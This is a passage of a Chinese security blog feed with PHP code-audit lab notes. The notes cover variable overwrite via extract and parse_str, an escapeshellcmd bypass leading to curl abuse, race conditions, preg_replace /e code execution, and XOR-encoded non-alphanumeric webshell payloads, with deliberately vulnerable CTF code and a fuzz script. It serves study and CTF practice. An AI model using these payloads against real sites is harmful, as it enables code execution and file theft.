class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;index.php&#39;);</span><br><span class="line">function waf($a)&#123;</span><br><span class="line">    foreach($a as $key &#x3D;&gt; $value)&#123;</span><br><span class="line">        if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123;</span><br><span class="line">            exit(&#39;are you a hacker&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;</span><br><span class="line">    if($$__R) &#123; </span><br><span class="line">        foreach($$__R as $__k &#x3D;&gt; $__v) &#123; </span><br><span class="line">            if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if($_POST) &#123; waf($_POST);&#125;</span><br><span class="line">if($_GET) &#123; waf($_GET); &#125;</span><br><span class="line">if($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line">if($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">if($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">if(isset($_GET[&#39;flag&#39;]))&#123;</span><br><span class="line">    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;hongri&#39;])&#123;</span><br><span class="line">        exit(&#39;error&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(md5($_GET[&#39;flag&#39;] ) &#x3D;&#x3D; md5($_GET[&#39;hongri&#39;]))&#123;</span><br><span class="line">        $url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">        $urlInfo &#x3D; parse_url($url);</span><br><span class="line">        if(!(&quot;http&quot; &#x3D;&#x3D;&#x3D; strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;&#x3D;&#x3D;&#x3D;strtolower($urlInfo[&quot;scheme&quot;])))&#123;</span><br><span class="line">            die( &quot;scheme error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $url &#x3D; escapeshellarg($url);</span><br><span class="line">        $url &#x3D; escapeshellcmd($url);</span><br><span class="line">        system(&quot;curl &quot;.$url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这道题目不光考了两个函数的作用，也考了变量覆盖和md5弱类型比较。<br>首先看变量覆盖的知识点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function waf($a)&#123;</span><br><span class="line">    foreach($a as $key &#x3D;&gt; $value)&#123;</span><br><span class="line">        if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123;</span><br><span class="line">            exit(&#39;are you a hacker&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;</span><br><span class="line">    if($$__R) &#123; </span><br><span class="line">        foreach($$__R as $__k &#x3D;&gt; $__v) &#123; </span><br><span class="line">            if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if($_POST) &#123; waf($_POST);&#125;</span><br><span class="line">if($_GET) &#123; waf($_GET); &#125;</span><br><span class="line">if($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line">if($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">if($_GET) extract($_GET, EXTR_SKIP);</span><br></pre></td></tr></table></figure><p>这段代码通过一个waf函数将get，post，cookie传进去的参数的参数名不能包含flag，如果这道题是判断的值不能不包含flag的话，直接使用数组绕过即可，但是判断的是参数名，我们还需要另想办法，最后发现倒数一二行有个extract函数，可以变量覆盖。但是设置了EXTP_SKIP参数，表示如果前面存在参数就不进行变量覆盖，最后看一下这个很关键的数组。这个数组的逻辑是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$__R如果存在，就循环遍历_POST,_GET,_COOKIE的键名和值，如果相等，就会unset变量。</span><br></pre></td></tr></table></figure><p>那么绕过就可以从这个开始：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先通过get传递flag&#x3D;test，通过post传递_GET[flag]。则$$__就是$_GET[flag]，$__v为test，即可消除变量。但是在最后有个extract函数，有会在创建一个$_GET[flag]&#x3D;test从而绕过waf函数。</span><br></pre></td></tr></table></figure><p>md5弱类型比较好绕过这里不在说明。<br>最后就是escapeshellarg和 escapeshellcmd的绕过，关键在于一句话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">escapeshellcmd ，会对以下的字符进行转义&amp;#;|*?~&lt;&gt;^()[]&#123;&#125;$, x0A 和 xFF, &#39; 和 &quot;仅在不配对儿的时候被转义。</span><br></pre></td></tr></table></figure><p>将不匹配的’和”转义，说明我们在传入的参数中添加个单引号即可绕过。<br>最后就是curl如何读取flag.php文件了，这里我们可以设置个vps监听，然后通过-F参数上传本地的flag.php到一个网站，这里拿百度为例，payload如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/34.png" class title="Da4er"><p>这里我没有复现成功，因为要想这么使用对curl的版本也是有要求的，最后附上wp的说明。</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/35.png" class title="Da4er"><hr><h2 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h2><h3 id="正则使用不当导致的路径穿越问题"><a href="#正则使用不当导致的路径穿越问题" class="headerlink" title="正则使用不当导致的路径穿越问题"></a>正则使用不当导致的路径穿越问题</h3><p>看题目给的实列：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/36.png" class title="Da4er"><p>在第20行unlink函数之前没有对传入的$file变量进行过滤，导致我们可以进行目录穿越来删除任意文件。<br>看官方给的说明：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/37.png" class title="Da4er"><h3 id="CTF-Docker-题目-2"><a href="#CTF-Docker-题目-2" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h3><p>题目如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if  (&quot;POST&quot; &#x3D;&#x3D; $_SERVER[&#39;REQUEST_METHOD&#39;])</span><br><span class="line">&#123;</span><br><span class="line">    $password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">    if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;$&#x2F;&#39;, $password))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#39;Wrong Format&#39;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    while (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        $reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;;</span><br><span class="line">        if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">            break;</span><br><span class="line">        $c &#x3D; 0;</span><br><span class="line">        $ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;);</span><br><span class="line">        foreach ($ps as $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password))</span><br><span class="line">            $c +&#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($c &lt; 3) break;</span><br><span class="line">        if (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag;</span><br><span class="line">        else echo &#39;Wrong password&#39;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在本地进行转换代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Create By Da4er.</span><br><span class="line"> *&#x2F;</span><br><span class="line">$password &#x3D;@$_POST[&#39;password&#39;];</span><br><span class="line">if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;$&#x2F;&#39;, $password))</span><br><span class="line">&#123;</span><br><span class="line">    echo &#39;Wrong Format&#39;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;;</span><br><span class="line">    if (6 &gt; preg_match_all($reg, $password, $arr))&#123;</span><br><span class="line">        echo &#39;wrong&#39;;</span><br><span class="line">        echo preg_match_all($reg, $password, $arr);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo 1111;</span><br><span class="line">        $c &#x3D; 0;</span><br><span class="line">        $ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;);</span><br><span class="line">        foreach ($ps as $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password))</span><br><span class="line">                $c +&#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($c &lt; 3)&#123;</span><br><span class="line">            echo &quot;da4er&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo 2222;</span><br><span class="line">            if (&quot;42&quot; &#x3D;&#x3D; $password)&#123;</span><br><span class="line">                echo &quot;true&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &quot;false&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/43.png" class title="Da4er"><p>经过了三次正则判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一.判断password变量里面有12个或12个以上的可打印字符</span><br><span class="line">二.password变量的打印字符，十进制数，小写字母，大写字母大于等于6</span><br><span class="line">三.匹配password中的字符，十进制数，小写字母，大写字母，如果匹配到$c变量加一</span><br></pre></td></tr></table></figure><p>经过上面的逻辑判断，payload如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/39.png" class title="Da4er"><p>即可绕过正则。<br>这里需要注意：<strong>弱类型比较漏洞，必须要进行类型转换，像本题的最后一个就是弱类型比较，进绕过时传入的password变量必须是int类型（一个小坑）</strong></p><h2 id="Day7"><a href="#Day7" class="headerlink" title="Day7"></a>Day7</h2><h3 id="parse-str引起的变量覆盖"><a href="#parse-str引起的变量覆盖" class="headerlink" title="parse_str引起的变量覆盖"></a>parse_str引起的变量覆盖</h3><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/44.png" class title="Da4er"><p>测试代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/45.png" class title="Da4er"><h3 id="CTF-Docker-题目-3"><a href="#CTF-Docker-题目-3" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h3><p>题目如下：<br><strong>index.php</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;hongri&quot;;</span><br><span class="line">echo $a;</span><br><span class="line">$id &#x3D; @$_GET[&#39;id&#39;];</span><br><span class="line">@parse_str($id);</span><br><span class="line">if ($a[0] !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; md5($a[0]) &#x3D;&#x3D; md5(&#39;QNKCDZO&#39;)) &#123;</span><br><span class="line">    echo &#39;&lt;a href&#x3D;&quot;uploadsomething.php&quot;&gt;flag is here&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo $a[0];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>uploadsoming.php</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$referer &#x3D; $_SERVER[&#39;HTTP_REFERER&#39;];</span><br><span class="line">if(isset($referer)!&#x3D;&#x3D; false) &#123;</span><br><span class="line">    $savepath &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;&#x2F;&quot;;</span><br><span class="line">    if (!is_dir($savepath)) &#123;</span><br><span class="line">        $oldmask &#x3D; umask(0);</span><br><span class="line">        mkdir($savepath, 0777);</span><br><span class="line">        umask($oldmask);</span><br><span class="line">    &#125;</span><br><span class="line">    if ((@$_GET[&#39;filename&#39;]) &amp;&amp; (@$_GET[&#39;content&#39;])) &#123;</span><br><span class="line">        &#x2F;&#x2F;$fp &#x3D; fopen(&quot;$savepath&quot;.$_GET[&#39;filename&#39;], &#39;w&#39;);</span><br><span class="line">        $content &#x3D; &#39;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#39;;</span><br><span class="line">        file_put_contents(&quot;$savepath&quot; . $_GET[&#39;filename&#39;], $content);</span><br><span class="line">        $msg &#x3D; &#39;Flag is here,come on~ &#39; . $savepath . htmlspecialchars($_GET[&#39;filename&#39;]) . &quot;&quot;;</span><br><span class="line">        echo $msg;</span><br><span class="line">        usleep(100000);</span><br><span class="line">        $content &#x3D; &quot;Too slow!&quot;;</span><br><span class="line">        file_put_contents(&quot;$savepath&quot; . $_GET[&#39;filename&#39;], $content);</span><br><span class="line">    &#125;</span><br><span class="line">   print &lt;&lt;&lt;EOT</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;form-group&quot;&gt;</span><br><span class="line">&lt;label for&#x3D;&quot;exampleInputEmail1&quot;&gt;Filename&lt;&#x2F;label&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;form-control&quot; name&#x3D;&quot;filename&quot; id&#x3D;&quot;exampleInputEmail1&quot; placeholder&#x3D;&quot;Filename&quot;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;form-group&quot;&gt;</span><br><span class="line">&lt;label for&#x3D;&quot;exampleInputPassword1&quot;&gt;Content&lt;&#x2F;label&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;form-control&quot; name&#x3D;&quot;content&quot; id&#x3D;&quot;exampleInputPassword1&quot; placeholder&#x3D;&quot;Contont&quot;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;btn btn-default&quot;&gt;Submit&lt;&#x2F;button&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">EOT;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#39;you can not see this page&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在index.php中可以通过parse_str进行变量覆盖：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/40.png" class title="Da4er"><p>在uploadsoming.php中主要使用的竞争原理，关键函数<strong>usleep(100000)</strong><br>关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((@$_GET[<span class="string">'filename'</span>]) &amp;&amp; (@$_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">       <span class="comment">//$fp = fopen("$savepath".$_GET['filename'], 'w');</span></span><br><span class="line">       $content = <span class="string">'HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r'</span>;</span><br><span class="line">       file_put_contents(<span class="string">"$savepath"</span> . $_GET[<span class="string">'filename'</span>], $content);</span><br><span class="line">       $msg = <span class="string">'Flag is here,come on~ '</span> . $savepath . htmlspecialchars($_GET[<span class="string">'filename'</span>]) . <span class="string">""</span>;</span><br></pre></td></tr></table></figure><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/46.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/41.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/42.png" class title="Da4er"><hr><h2 id="Day8"><a href="#Day8" class="headerlink" title="Day8"></a>Day8</h2><h3 id="preg-replace与代码执行"><a href="#preg-replace与代码执行" class="headerlink" title="preg_replace与代码执行"></a>preg_replace与代码执行</h3><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/47.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/48.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/49.png" class title="Da4er"><p>测试代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/50.png" class title="Da4er"><p>上面那段代码的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*&#x3D;$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><p>这里主要利用了三个知识点：<strong>preg_replace()函数/e模式导致的代码执行，正则中(\1)表示捕获第一个匹配的字符串，双引号导致的变量解</strong> <strong>析(可变变量)</strong><br>参考博客：<br><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><h3 id="CTF-Docker-题目-4"><a href="#CTF-Docker-题目-4" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h3><p>有两道CTF题目，代码如下：<br>一</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/51.png" class title="Da4er"><p>这道题主要利用了无字母或数字的webshell，参考<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list" %3ehttps: www.leavesongs.com penetration webshell-without-alphanum.html?page="2#reply-list"">p神博客</a><br>fuzz脚本如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/52.png" class title="Da4er"><p>将这些数字对应的ascii找出来，在url编码一下，得到payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;</span><br><span class="line">等效于：</span><br><span class="line">$_&#x3D;getFlag;</span><br></pre></td></tr></table></figure><p>最后利用：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/53.png" class title="Da4er"><hr><p>二</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/54.png" class title="Da4er"><p>相比于第一个，过滤了下划线。可以使用中文字符代替，或者测试一些那些字符可以当作变量名fuzz脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    asc &#x3D; &quot;%%%02x&quot; % i</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;PHP&#x2F;ceshi&#x2F;webshell&#x2F;index.php?code&#x3D;$%s&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%%1c%%1e%%0f%%3d%%17%%1a%%1c&quot;;$%s();&#39; % (asc,asc)</span><br><span class="line">    r &#x3D; requests.get(url)</span><br><span class="line">    if &#39;flag&#39; in r.text:</span><br><span class="line">        print(&quot;%s 可用&quot; % asc)</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$呵&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$呵&#125;[呵]($&#123;$呵&#125;[呵]);&amp;呵&#x3D;getFlag</span><br><span class="line">$%7F&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1C%1E%0F%3d%17%1A%1C&quot;;$%7F();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h2 id=&quot;Day1&quot;&gt;&lt;a href=&quot;#Day1&quot; class=&quot;headerlink&quot; title=&quot;Day1&quot;&gt;&lt;/a&gt;Day1&lt;/h2&gt;&lt;h4 id=&quot;in-array-函数漏洞&quot;&gt;&lt;a href=&quot;#in-array-函数漏洞&quot; class=&quot;headerlink&quot; title=&quot;in_array()函数漏洞&quot;&gt;&lt;/a&gt;in_array()函数漏洞&lt;/h4&gt;&lt;img src=&quot;/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png&quot; class title=&quot;Da4er&quot;&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://da4er.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://da4er.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>PHP留言板开发</title>
    <link href="https://da4er.top/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91.html"/>
    <id>https://da4er.top/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91.html</id>
    <published>2020-03-03T12:59:59.000Z</published>
    <updated>2020-03-03T13:12:21.440Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>经过两天的奋斗，终于把一套简单的PHP留言板开发完成了。这套源码从前台到后台，最后到数据库都是一步一步来完成的，主要是为了熟悉一下PHP开发的基本流程和一些功能点的设计思路，为了接下来的代码审计做准备。</p><a id="more"></a><hr><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>首先设计前端页面，前端页面主要使用的boostraps框架(因为这个框架简单好用23333…)。自己也不会前端，所以用到什么就去Boostrap官网现找。<br>其次是设计数据库，数据库的话需要三张表：user表，comment表，admin表。<br>设计代码如下：<br>comment：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table comment(</span><br><span class="line">    id int unsigned not null auto_increment,</span><br><span class="line">    comment varchar(255) not null,</span><br><span class="line">    primary key(id)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8 comment &quot;评论表&quot;</span><br></pre></td></tr></table></figure><hr><p>user表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create table user(</span><br><span class="line">    